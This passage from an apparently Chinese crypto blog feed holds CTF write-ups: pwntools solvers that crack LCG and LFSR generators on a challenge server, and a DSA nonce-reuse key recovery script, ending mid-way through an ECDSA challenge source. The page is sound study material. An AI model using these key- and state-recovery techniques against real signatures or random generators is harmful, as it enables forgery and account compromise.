id="Challenge-10"><a href="#Challenge-10" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>nc 182.92.108.71 30641</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/nil2NEBlE2eeay9s.py?attname=%E5%AF%BB%E5%AE%9D%E5%A4%A7%E5%86%92%E9%99%A91.py&download">附件</a></p><p>基准分数 350</p><p>当前分数 350</p><p>完成人数 17</p></blockquote><h2 id="Solution-10"><a href="#Solution-10" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>就是LCG全家桶（见我之前的<a href="https://h-lither.github.io/2021/01/28/Crypto-LCG/">博客</a>），不过数都是随机的，可能不能满足标准LCG。故要写脚本爆破。</p><h3 id="脚本-5"><a href="#脚本-5" class="headerlink" title="脚本"></a>脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>(<span class="params">a,m,x1,x2</span>):</span></span><br><span class="line">    a = <span class="built_in">int</span>(a)</span><br><span class="line">    n = <span class="built_in">int</span>(m)</span><br><span class="line">    output1 = <span class="built_in">int</span>(x1)</span><br><span class="line">    output2 = <span class="built_in">int</span>(x2)</span><br><span class="line">    b = (output2 - a * output1) % n</span><br><span class="line">    <span class="keyword">return</span> b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun2</span>(<span class="params">m,x3,x4,x5</span>):</span></span><br><span class="line">    n = <span class="built_in">int</span>(m)</span><br><span class="line">    output = [<span class="built_in">int</span>(x3), <span class="built_in">int</span>(x4), <span class="built_in">int</span>(x5)]</span><br><span class="line">    d = inverse((output[<span class="number">1</span>] - output[<span class="number">0</span>]), n)</span><br><span class="line">    a = (output[<span class="number">2</span>] - output[<span class="number">1</span>]) * inverse((output[<span class="number">1</span>] - output[<span class="number">0</span>]), n) % n</span><br><span class="line">    ani = inverse(a, n)</span><br><span class="line">    b = (output[<span class="number">1</span>] - a * output[<span class="number">0</span>]) % n</span><br><span class="line">    <span class="keyword">return</span> a ,b</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun3</span>(<span class="params">x6,x7,x8,x9,x10,x11,x12</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gcd, invert</span><br><span class="line">    s = [<span class="built_in">int</span>(x6),</span><br><span class="line">         <span class="built_in">int</span>(x7),</span><br><span class="line">         <span class="built_in">int</span>(x8),</span><br><span class="line">         <span class="built_in">int</span>(x9),</span><br><span class="line">         <span class="built_in">int</span>(x10),</span><br><span class="line">         <span class="built_in">int</span>(x11),</span><br><span class="line">         <span class="built_in">int</span>(x12)</span><br><span class="line">         ]</span><br><span class="line">    t = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        t.append((s[i] - s[i - <span class="number">1</span>]))</span><br><span class="line">    all_n = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        all_n.append(gcd((t[i + <span class="number">1</span>] * t[i - <span class="number">1</span>] - t[i] * t[i]), (t[i + <span class="number">2</span>] * t[i] - t[i + <span class="number">1</span>] * t[i + <span class="number">1</span>])))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> all_n:</span><br><span class="line">        n=<span class="built_in">abs</span>(n)</span><br><span class="line"></span><br><span class="line">    x=all_n[<span class="number">2</span>]</span><br><span class="line">    y=all_n[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">return</span> x <span class="keyword">if</span> x &lt; y <span class="keyword">else</span> y</span><br><span class="line">k=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> k&lt;<span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30641</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># context.log_level = &#x27;Debug&#x27;</span></span><br><span class="line">        n=p.recvline()[<span class="number">1</span>:-<span class="number">2</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        a1=n[:<span class="number">20</span>].replace(<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        m1=n[<span class="number">20</span>:].replace(<span class="string">&#x27;, &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x1=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x2=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        f1=fun1(a1,m1,x1,x2)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f1))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        m2=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x3=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        x4=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x5=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        f21,f22=fun2(m2,x3,x4,x5)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f21))</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f22))</span><br><span class="line"></span><br><span class="line">        x6=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x7=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x8=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x9=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x10=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x11=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        x12=p.recvline()[:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        f3=fun3(x6,x7,x8,x9,x10,x11,x12)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(f3))</span><br><span class="line">        print(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        dd=p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> dd ==<span class="string">&#x27;win&#x27;</span>:</span><br><span class="line">            print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">            k=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224055544355.png" alt="image-20210224055544355"></p><h3 id="Getflag-7"><a href="#Getflag-7" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;Cracking^prng_Linear)Congruential&amp;Generators&#125;</span><br></pre></td></tr></table></figure><h1 id="2-寻宝大冒险2"><a href="#2-寻宝大冒险2" class="headerlink" title="2.寻宝大冒险2"></a>2.寻宝大冒险2</h1><h2 id="Challenge-11"><a href="#Challenge-11" class="headerlink" title="Challenge"></a>Challenge</h2><blockquote><p>描述</p><p>nc 182.92.108.71 30607</p><p>题目地址 </p><p><a href="https://uploader.shimo.im/f/yC6oZlPV8OUhYsEb.py?attname=%E5%AF%BB%E5%AE%9D%E5%A4%A7%E5%86%92%E9%99%A92.py&download">附件</a></p><p>基准分数 300</p><p>当前分数 300</p><p>完成人数 14</p></blockquote><h2 id="Solution-11"><a href="#Solution-11" class="headerlink" title="Solution"></a>Solution</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>LSRF，不过在返回的时候使用了|，跟^只差在都为1的时候还没1.故也存在概率。</p><p>当等于20时候，没有正确的话再一次重新运行程序。直到正确为止。</p><h3 id="脚本-6"><a href="#脚本-6" class="headerlink" title="脚本"></a>脚本</h3><p>(没有优化，代码有点难看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun</span>(<span class="params">data</span>):</span></span><br><span class="line"></span><br><span class="line">    data = <span class="built_in">bin</span>(<span class="built_in">int</span>(data,<span class="number">16</span>))[<span class="number">2</span>:]</span><br><span class="line">    LEN = <span class="number">40</span></span><br><span class="line">    LMASK = <span class="number">2</span> ** (LEN + <span class="number">1</span>) - <span class="number">1</span></span><br><span class="line">    MASK = <span class="number">0b1011001010001010000100001000111011110101</span></span><br><span class="line">    key = <span class="number">0b0</span></span><br><span class="line">    init = <span class="built_in">int</span>(data[:LEN - <span class="number">1</span>], <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, LEN):  </span><br><span class="line">        i = init &amp; MASK &amp; LMASK</span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(LEN - <span class="number">1</span>):</span><br><span class="line">            output ^= (i &amp; <span class="number">1</span>)</span><br><span class="line">            i = i &gt;&gt; <span class="number">1</span></span><br><span class="line">        bit = <span class="built_in">int</span>(data[LEN - n - <span class="number">1</span>]) ^ output</span><br><span class="line">        key |= bit &lt;&lt; n</span><br><span class="line">        init = (init &gt;&gt; <span class="number">1</span>) | (bit &lt;&lt; (LEN - <span class="number">2</span>))  </span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LXFIQNN</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, init, mask, length</span>):</span></span><br><span class="line">        self.init = init</span><br><span class="line">        self.mask = mask</span><br><span class="line">        self.lengthmask = <span class="number">2</span>**(length+<span class="number">1</span>)-<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        nextdata = (self.init &lt;&lt; <span class="number">1</span>) &amp; self.lengthmask</span><br><span class="line"></span><br><span class="line">        i = self.init &amp; self.mask &amp; self.lengthmask</span><br><span class="line"></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i != <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">            output ^= (i &amp; <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            i = i &gt;&gt; <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        nextdata ^= output</span><br><span class="line"></span><br><span class="line">        self.init = nextdata</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">random</span>(<span class="params">self, nbit</span>):</span></span><br><span class="line">        output = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(nbit):</span><br><span class="line">            output &lt;&lt;= <span class="number">1</span></span><br><span class="line">            <span class="comment"># print(&#x27;===&#x27;+str(output))</span></span><br><span class="line">            d=self.<span class="built_in">next</span>()</span><br><span class="line"></span><br><span class="line">            output ^= d</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;182.92.108.71&#x27;</span>,<span class="number">30607</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">d=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="comment"># print(p.recvline()[:].decode(&#x27;utf-8&#x27;))</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;122&#x27;</span>)</span><br><span class="line">    dd=<span class="built_in">hex</span>(<span class="built_in">int</span>(p.recvline()[<span class="number">27</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>).strip()))</span><br><span class="line">    d+=dd[<span class="number">2</span>:]</span><br><span class="line">print(d)</span><br><span class="line">key=fun(d)</span><br><span class="line">prng = LXFIQNN(key, <span class="number">0b1011001010001010000100001000111011110101</span>, <span class="number">40</span>)</span><br><span class="line">t=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    secret = prng.random(<span class="number">4</span>)</span><br><span class="line">    t+=<span class="built_in">hex</span>(secret)[<span class="number">2</span>:]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">190</span>):</span><br><span class="line">        secret = prng.random(<span class="number">4</span>)</span><br><span class="line">        print(p.recvline()[<span class="number">0</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="built_in">str</span>(secret))</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)<span class="comment">#防止交互过快，还没接收完信息，服务器中断链接。</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210224060035458.png" alt="image-20210224060035458"></p><h3 id="Getflag-8"><a href="#Getflag-8" class="headerlink" title="Getflag"></a>Getflag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;lfsr_121a111y^use-in&amp;crypto&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;-Week1&lt;/p&gt;
&lt;h1 id=&quot;1-Transformer&quot;&gt;&lt;a href=&quot;#1-Transformer&quot; class=&quot;headerlink&quot; title=&quot;1.Transformer&quot;&gt;&lt;/a&gt;1.Transformer&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;Cate</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Crypto-RSA</title>
    <link href="http://example.com/2021/02/24/Crypto-RSA/"/>
    <id>http://example.com/2021/02/24/Crypto-RSA/</id>
    <published>2021-02-23T20:19:42.000Z</published>
    <updated>2021-02-23T20:19:42.147Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>Crypto-DSA&amp;ECDSA</title>
    <link href="http://example.com/2021/02/23/Crypto-DSA-ECDSA/"/>
    <id>http://example.com/2021/02/23/Crypto-DSA-ECDSA/</id>
    <published>2021-02-23T01:26:44.000Z</published>
    <updated>2021-02-22T21:00:40.764Z</updated>
    
    <content type="html"><![CDATA[<p>-</p><h1 id="DSA"><a href="#DSA" class="headerlink" title="DSA"></a>DSA</h1><h2 id="DSA签名过程："><a href="#DSA签名过程：" class="headerlink" title="DSA签名过程："></a>DSA签名过程：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043552604.png" alt="image-20210223043552604"></p><h2 id="签名验证及原理："><a href="#签名验证及原理：" class="headerlink" title="签名验证及原理："></a>签名验证及原理：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043713543.png" alt="image-20210223043713543"></p><h2 id="DSA攻击方式："><a href="#DSA攻击方式：" class="headerlink" title="DSA攻击方式："></a>DSA攻击方式：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043722223.png" alt="image-20210223043722223"></p><h1 id="ECDSA"><a href="#ECDSA" class="headerlink" title="ECDSA"></a>ECDSA</h1><h2 id="ECDSA签名过程："><a href="#ECDSA签名过程：" class="headerlink" title="ECDSA签名过程："></a>ECDSA签名过程：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043759652.png" alt="image-20210223043759652"></p><h2 id="ECDSA验签即原理："><a href="#ECDSA验签即原理：" class="headerlink" title="ECDSA验签即原理："></a>ECDSA验签即原理：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043832576.png" alt="image-20210223043832576"></p><h2 id="ECDSA攻击方式："><a href="#ECDSA攻击方式：" class="headerlink" title="ECDSA攻击方式："></a>ECDSA攻击方式：</h2><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210223043436542.png" alt="image-20210223043436542"></p><h1 id="例题："><a href="#例题：" class="headerlink" title="例题："></a>例题：</h1><h2 id="DSA–SUCTF-2019-DSA"><a href="#DSA–SUCTF-2019-DSA" class="headerlink" title="DSA–SUCTF 2019  DSA"></a>DSA–SUCTF 2019  DSA</h2><p>(没找到题目，只有一篇WP，里面包含了题目的值)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> DSA</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.asymmetric.rsa <span class="keyword">import</span> _modinv</span><br><span class="line"></span><br><span class="line">p = <span class="number">89884656743115795580686663829063433723705316331915518116995555215732107995059028542508401244839154951727540560161931978595376162965578570688594466436802284147607626105578924348149452183916543288346766737451989059750506942292767656446346135964708979885460659773076011464167414551120634816058711585048191954497</span></span><br><span class="line">q = <span class="number">1111804377363103506497255080558092668997313464491</span></span><br><span class="line">g = <span class="number">81015871603456981032885262867256289415428185718067221863176015480426278916784273932461088597278453025238130171264554340337052290801398971212149002598733514497274080038687844873045392142055341888546884513467006243654622193996237786587933291936305860861104505778330178660321910982065964185311229731036440300912</span></span><br><span class="line">y = <span class="number">24205967076065946398939942966555243225474145978138314135133201932616151998778053968114291774217862261420967723355996662814191035892360634754604901035581578539634376520187757713469318847622699231634156440729178396025399617453913697005440949117064991219553520585024955478025227096450962672242862991836900979588</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到一组同r的数据，m为字符串的md5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And see the brave day sunk in hideous night</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 189275664133327295485034625257633857845</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 671563422243860980520073471433161684440141852624L)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># And sable curls all silver&#x27;d o&#x27;er with white</span></span><br><span class="line"><span class="comment"># Its MD5 digest: 76447611971473350019028042637993930502</span></span><br><span class="line"><span class="comment"># (1110285731834476772119910400331516120389395795749L, 218895397309026853341136197466419726836220239272L)</span></span><br><span class="line"></span><br><span class="line">s0=<span class="number">671563422243860980520073471433161684440141852624</span></span><br><span class="line">s1=<span class="number">218895397309026853341136197466419726836220239272</span></span><br><span class="line"></span><br><span class="line">m0=<span class="number">189275664133327295485034625257633857845</span></span><br><span class="line">m1=<span class="number">76447611971473350019028042637993930502</span></span><br><span class="line"></span><br><span class="line">r= <span class="number">1110285731834476772119910400331516120389395795749</span></span><br><span class="line"></span><br><span class="line">dm=m1-m0</span><br><span class="line">ds=s1-s0</span><br><span class="line"></span><br><span class="line">k = gmpy2.mul(dm, gmpy2.invert(ds, q))</span><br><span class="line">k = gmpy2.f_mod(k, q)</span><br><span class="line">tmp = gmpy2.mul(k, s0) - m0</span><br><span class="line">x = tmp * gmpy2.invert(r, q)</span><br><span class="line">x = gmpy2.f_mod(x, q)</span><br><span class="line"></span><br><span class="line">data5=<span class="string">&quot;&quot;&quot;And nothing &#x27;gainst Time&#x27;s scythe can make defence&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">kinv = _modinv(k, q)</span><br><span class="line">h = hashlib.md5(data5.encode()).digest()</span><br><span class="line">h = <span class="built_in">int</span>.from_bytes(h, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">s = kinv * (h + r * x) % q</span><br><span class="line">print(<span class="string">&quot;(&quot;</span>+<span class="built_in">str</span>(r)+<span class="string">&quot;L, &quot;</span>+<span class="built_in">str</span>(<span class="built_in">int</span>(s))+<span class="string">&quot;L)&quot;</span>)</span><br><span class="line"><span class="comment">#flag：flag&#123;Wh4t_a_Prety_Si3nature!&#125;</span></span><br></pre></td></tr></table></figure><h2 id="ECDSA—CTF-show-F5杯-Crypto-soezecdsa"><a href="#ECDSA—CTF-show-F5杯-Crypto-soezecdsa" class="headerlink" title="ECDSA—CTF.show (F5杯-Crypto-soezecdsa)"></a>ECDSA—CTF.show (F5杯-Crypto-soezecdsa)</h2><p>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ecdsa</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">k</span>):</span></span><br><span class="line"><span class="keyword">return</span> k + <span class="built_in">chr</span>(<span class="number">16</span> - <span class="built_in">len</span>(k) % <span class="number">16</span>) * (<span class="number">16</span> - <span class="built_in">len</span>(k) % <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">g = ecdsa.NIST256p.generator</span><br><span class="line"><span class="built_in">ord</span> = g.order()</span><br><span class="line">ss = random.randrange(<span class="number">1</span>, <span class="built_in">ord</span>)</span><br><span class="line"></span><br><span class="line">pub = ecdsa.ecdsa.Public_key(g, g * ss)</span><br><span class="line">priv = ecdsa.ecdsa.Private_key(pub, ss)</span><br><span class="line"> </span><br><span class="line">n = random.randrange(<span class="number">1</span>, <span class="number">2</span> ** <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">h1 = random.randrange(<span class="number">1</span>, <span class="built_in">ord</span>)</span><br><span class="line">h2 = random.randrange(<span class="number">1</span>, <span class="built_in">ord</span>)</span><br><span class="line">s1 = priv.sign(h1, n)</span><br><span class="line">s2 = priv.sign(h2, n)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(ss.to_bytes(<span class="number">64</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)[<span class="number">0</span>:<span class="number">16</span>], AES.MODE_CBC, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">16</span>)</span><br><span class="line">c = cipher.encrypt(pad(<span 